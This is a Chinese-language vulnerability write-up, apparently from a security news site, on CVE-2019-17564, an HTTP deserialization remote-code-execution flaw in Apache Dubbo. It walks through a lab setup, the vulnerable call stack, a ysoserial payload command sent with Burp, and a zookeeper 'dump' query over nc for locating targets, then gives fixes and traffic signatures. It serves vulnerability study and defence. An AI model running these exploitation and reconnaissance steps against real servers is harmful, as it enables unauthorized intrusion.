# CVE-2019-17564 Apache Dubbo Http 反序列化漏洞深入分析

阅读量 **306165**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-09-10 14:30:59

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 前言

上一篇文章勉强算是把Shiro反序列化漏洞分析了一遍。

由于本人是一个初学者，也没啥学习方法，只能多看几个漏洞的分析过程了。

今天周末，来分析一下Dubbo框架的RCE漏洞。

也许看多了，量变引发质变，也就会自己分析了吧。

## Dubbo简介

官网: <https://dubbo.apache.org/zh-cn/>

Apache Dubbo
是一个基于Java的高性能，轻量级的RPC框架。Dubbo提供了三个关键功能，包括基于接口的远程呼叫，容错和负载平衡以及自动服务注册和发现。

功能列表：【基于透明接口的RPC、智能负载均衡、自动服务注册和发现、高扩展性、运行时流量路由、可视化服务治理】  
GitHub： <https://github.com/apache/dubbo>

Dubbo支持Dubbo、RMI、Hessian、HTTP、WebService、Thrift、Native
Thrift、Memcached、Redis、Rest、JsonRPC、XmlRPC、JmsRpc等协议，官方推荐使用Dubbo协议。

## 漏洞描述

在启用HTTP远程处理的Dubbo应用程序中发生不安全的反序列化。如果此实例启用了HTTP，则攻击者可能会提交其中包含Java对象的POST请求，以完全破坏Apache
Dubbo的Provider实例。

Dubbo HTTP实例尝试对Java ObjectStream中的数据进行反序列化，该Java
ObjectStream包含一组恶意类，通常称为小工具链，其调用会导致执行恶意代码。在这种情况下，有问题的恶意代码允许使用任意OS命令。

## 影响范围

2.7.0 <= Apache Dubbo <= 2.7.4.1

2.6.0 <= Apache Dubbo <= 2.6.7

Apache Dubbo = 2.5.x

此漏洞仅影响启用Dubbo提供的http协议的用户

## 漏洞环境搭建

搭建Dubbo环境之前，需要先启动依赖环境`zookeeper`。

为什么用`zookeeper`？

因为官方推荐使用`zookeeper`

`zookeeper`是什么？

`zookeeper`是注册中心，提供服务注册和发现功能。

详见： [Zookeeper 注册中心](https://dubbo.apache.org/zh-cn/docs/user/references/registry/introduction.html)

###  `zookeeper`环境搭建

下载：
<http://archive.apache.org/dist/zookeeper/zookeeper-3.3.3/zookeeper-3.3.3.tar.gz>

解压：windows系统利用安装的解压软件直接解压。

配置：[官方配置文档](https://dubbo.apache.org/zh-cn/docs/admin/install/zookeeper.html)

在根目录新建文件夹`data`

重命名文件`zookeeper-3.3.3\conf\zoo_sample.cfg`为`zookeeper-3.3.3\conf\zoo.cfg`

修改文件`zookeeper-3.3.3\conf\zoo.cfg`中`dataDir=/export/crawlspace/mahadev/zookeeper/server1/data`为`dataDir=刚新建的data目录的绝对路径`

运行： Windows系统双击 `zookeeper-3.3.3\bin\zkServer.cmd`

看到如下内容，启动成功。绑定本地端口2181

    
    
    ·
    2020-09-04 16:16:47,110 - INFO  [main:ZooKeeperServerMain@94] - Starting server
    ·
    ·
    2020-09-04 16:16:51,675 - INFO  [main:ZooKeeperServer@663] - tickTime set to 2000
    2020-09-04 16:16:51,686 - INFO  [main:ZooKeeperServer@672] - minSessionTimeout set to -1
    2020-09-04 16:16:51,687 - INFO  [main:ZooKeeperServer@681] - maxSessionTimeout set to -1
    2020-09-04 16:16:51,988 - INFO  [main:NIOServerCnxn$Factory@143] - binding to port 0.0.0.0/0.0.0.0:2181
    2020-09-04 16:16:52,004 - INFO  [main:FileTxnSnapLog@208] - Snapshotting: 0
    

###  Dubbo环境搭建

####  下载和配置

下载：<https://github.com/apache/dubbo-samples>

由于只有http协议受影响，所以提取出http协议部分。`dubbo-samples-master\java\dubbo-samples-http`

配置：

修改`dubbo-samples-http\poc.xml`配置

  1. 改为受影响版本，这里使用2.7.3 
    
        <dubbo.version>2.7.7</dubbo.version>
    改为
    <dubbo.version>2.7.3</dubbo.version>
    

  2. 加入一个恶意的GadGets，比如：commons-collections-4 
    
        <dependency>
     <groupId>org.apache.commons</groupId>
     <artifactId>commons-collections4</artifactId>
     <version>4.0</version>
    </dependency>
    

修改`dubbo-samples-http\src\main\resources\spring\http-provider.xml`配置

    
    
    <dubbo:application name="http-provider"/>
    // 确认zookeeper的IP和端口
    <dubbo:registry address="zookeeper://${zookeeper.address:127.0.0.1}:2181"/>
    // 配置dubbo的端口和ip，添加host字段，值为本机IP
    <dubbo:protocol name="http" id="http" host="192.168.1.3" port="${servlet.port:8080}" server="${servlet.container:tomcat}"/>
    
    <bean id="demoService" class="org.apache.dubbo.samples.http.impl.DemoServiceImpl"/>
    
    <dubbo:service interface="org.apache.dubbo.samples.http.api.DemoService" ref="demoService" protocol="http"/>
    

####  导入idea

英文版IDEA: File->New->Project from existing resources ->选择目录”dubbo-samples-http”里面的pom.xml

中文版IDEA: 文件->New->项目从现有源->选择目录”dubbo-samples-http”里面的pom.xml

这时候就开始下载`Maven`项目的依赖了，一般会很慢。更换国内`Maven`源下载依赖会快很多，参考下面文章。

![](https://p5.ssl.qhimg.com/t0102a6cb74d3dffddd.png)

####  启动

找到路径`\dubbo-samples-http\src\main\java\org\apache\dubbo\samples\http\HttpProvider.java`，右键->运行(U)
‘HttpProvider.main()’

看到如下内容，表示启动成功：

    
    
    [04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperRegistry:  [DUBBO] Load registry cache file ···
    [04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperTransporter:  [DUBBO] find valid zookeeper ····
    [04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperRegistry:  [DUBBO]  Register: http://192.168.186.1:8080/org.apache.dubbo.samples.http.api.DemoService?······
    [04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperRegistry:  [DUBBO] Subscribe:····
    [04/09/20 05:45:14:014 CST] main  INFO zookeeper.ZookeeperRegistry:  [DUBBO] Notify urls for ····
    dubbo service started
    

## 漏洞分析

根据网上的资料，在`org.apache.dubbo.remoting.http.servlet.DispatcherServlet#service:43`处设置断点。

接着利用burp发送paylaod，来到断点处。

![](https://p1.ssl.qhimg.com/t018edb9957285063c6.png)

然后按F7开始调试。首先来到`org.apache.dubbo.rpc.protocol.http.HttpProtocol.InternalHandler#handle`方法内。

169：获取请求路径

170：实例化HttpInvokerServiceExporter方法，并传递请求路径。

174：设置请求的地址和端口，并初始化。

![](https://p2.ssl.qhimg.com/t01508601c9ae6adeb5.png)

接着，来到`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#handleRequest`方法内。

29 ：读远程调用

![](https://p4.ssl.qhimg.com/t0142dfc95d55492e64.png)

`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#readRemoteInvocation(javax.servlet.http.HttpServletRequest,
java.io.InputStream)`

![](https://p1.ssl.qhimg.com/t0147e548ab7c87070b.png)

最终，来到`org.springframework.remoting.rmi.RemoteInvocationSerializingExporter#doReadRemoteInvocation`方法内  
68：反序列化读取对象，没有进行安全验证，从而触发反序列化漏洞执行任意代码。

![](https://p0.ssl.qhimg.com/t011c12160a5ade8260.png)

堆栈

    
    
    doReadRemoteInvocation:144, RemoteInvocationSerializingExporter (org.springframework.remoting.rmi)
    readRemoteInvocation:121, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)
    readRemoteInvocation:100, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)
    handleRequest:79, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)
    handle:216, HttpProtocol$InternalHandler (org.apache.dubbo.rpc.protocol.http)
    service:61, DispatcherServlet (org.apache.dubbo.remoting.http.servlet)
    service:790, HttpServlet (javax.servlet.http)
    internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
    invoke:198, StandardWrapperValve (org.apache.catalina.core)
    invoke:96, StandardContextValve (org.apache.catalina.core)
    invoke:496, AuthenticatorBase (org.apache.catalina.authenticator)
    invoke:140, StandardHostValve (org.apache.catalina.core)
    invoke:81, ErrorReportValve (org.apache.catalina.valves)
    invoke:87, StandardEngineValve (org.apache.catalina.core)
    service:342, CoyoteAdapter (org.apache.catalina.connector)
    service:803, Http11Processor (org.apache.coyote.http11)
    process:66, AbstractProcessorLight (org.apache.coyote)
    process:790, AbstractProtocol$ConnectionHandler (org.apache.coyote)
    doRun:1468, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
    run:49, SocketProcessorBase (org.apache.tomcat.util.net)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
    run:748, Thread (java.lang)
    

## 漏洞复现

###  payload生成

ysoserial.jar工具直接下载GitHub地址 <https://gitter.im/frohoff/ysoserial>

`java -jar ysoserial.jar CommonsCollections4 calc > calc.ser`

###  发包

浏览器访问HTTP协议接口路径（参考`target/classes/spring/http-provider.xml`文件中的配置）

`http://192.168.186.1:8080/org.apache.dubbo.samples.http.api.DemoService`，抓取请求包。

发送到burp的重放模块，请求方式改为`POST`，数据体用`Paste from file`选项选择刚才的paylaod文件`calc.ser`  
点击`Go`即可出发漏洞执行`calc`命令

![](https://p1.ssl.qhimg.com/t01f1c5cab75f7d7399.png)

![](https://p1.ssl.qhimg.com/t017e089b5e600b2746.png)

## 识别及利用

虽然这个漏洞复现起来挺简单的，但是，在实际渗透测试中使用却存在两个难点：

  1. 不能确定目标Dubbo是否使用http协议。
  2. 无法确定接口路径。

那么问题来了，黑盒情况下如何获取这些信息？

我首先想到拿我本地复现时的默认接口路径去尝试，经过一番fofa、shodan尝试，随即否定了。

我们回过头来分析一下，接口信息是写在`http-provider.xml`配置中的，如下，配置的最后一行：

    
    
    <beans xmlns:xsi="http://www.w3.org/2001/XMLSchema-i·······">
        <context:property-placeholder/>
    
        <dubbo:application name="http-provider"/>
    
        <dubbo:registry address="zookeeper://${zookeeper.address:127.0.0.1}:2181"/>
    
        <dubbo:protocol name="http" id="http" host="192.168.186.1" port="${servlet.port:8080}" server="${servlet.container:tomcat}"/>
    
        <bean id="demoService" class="org.apache.dubbo.samples.http.impl.DemoServiceImpl"/>
    
        <dubbo:service interface="org.apache.dubbo.samples.http.api.DemoService" ref="demoService" protocol="http"/>
    </beans>
    

同时，Dubbo又跟zookeeper有交互。

虽然我们不能直接查看`http-provider.xml`配置文件，但是zookeeper默认情况下，存在未授权访问漏洞。正好可以利用这个漏洞来查看接口路径，同时也解决了Dubbo所使用的协议的问题。

    
    
    kali@kali:~$ echo dump | nc  192.168.186.1 2181
    SessionTracker dump:
    Session Sets (3):
    0 expire at Sun Sep 06 15:32:44 CST 2020:
    0 expire at Sun Sep 06 15:32:56 CST 2020:
    1 expire at Sun Sep 06 15:33:10 CST 2020:
            0x1745a82ab030007
    ephemeral nodes dump:
    Sessions with Ephemerals (1):
    0x1745a82ab030007:
            /dubbo/org.apache.dubbo.samples.http.api.DemoService/providers/http%3A%2F%2F192.168.186.1%3A8080%2Forg.apache.dubbo.samples.http.api.DemoService%3Fanyhost%3Dfalse%26application%3Dhttp-provider%26bean.name%3Dorg.apache.dubbo.samples.http.api.DemoService%26deprecated%3Dfalse%26dubbo%3D2.0.2%26dynamic%3Dtrue%26generic%3Dfalse%26interface%3Dorg.apache.dubbo.samples.http.api.DemoService%26methods%3DsayHello%26pid%3D4988%26register%3Dtrue%26release%3D2.7.3%26server%3Dtomcat%26side%3Dprovider%26timestamp%3D1599374218648
    

当然，还有其他情况，期待大佬补充。

## 修复及防御方案

###  修复

第一种、 最简单的，就是升级到不受影响版本，具体升级步骤参考官方文档。

<https://github.com/apache/dubbo/releases/tag/dubbo-2.7.5>

第二种、 禁用http协议，使用其他Dubbo支持协议。

修改`http-provider.xml`配置文件：

    
    
     <dubbo:protocol name="准备使用的协议" id="http" host="192.168.186.1" port="${servlet.port:8080}" server="${servlet.container:tomcat}"/>
    

具体详情参考官方协议配置文档。

###  防御方案

下面分析一下漏洞利用过程中的数据交互，以期找到其特征，从而有针对性的识别攻击。

在虚拟机中，用python写了个脚本，来利用此漏洞。

通过Wireshark抓包，如下：

![](https://p5.ssl.qhimg.com/t01111a83ced7f05410.png)

![](https://p1.ssl.qhimg.com/t014c68f2494cd04ce8.png)

不过，现在市面上的大多数WAF都添加了此漏洞的特征。

## 参考

  * [【CVE-2019-17564】 Apache Dubbo反序列化漏洞-Pony Mail](https://lists.apache.org/thread.html/r13f7a58fa5d61d729e538a378687118e00c3e229903ba1e7b3a807a2%40%3Cdev.dubbo.apache.org%3E)
  * [Apache Dubbo官网](https://dubbo.apache.org/zh-cn/index.html)
  * [Apache Dubbo反序列化漏洞（CVE-2019-17564） – 冬泳怪鸽 – 博客园](https://www.cnblogs.com/zaqzzz/p/12443794.html)
  * [Zookeeper未授权访问测试](https://www.cnblogs.com/Hi-blog/p/Zookeeper-UnAuthorization-Access.html)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **langke** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/216697](/post/id/216697)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __2赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) langke

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

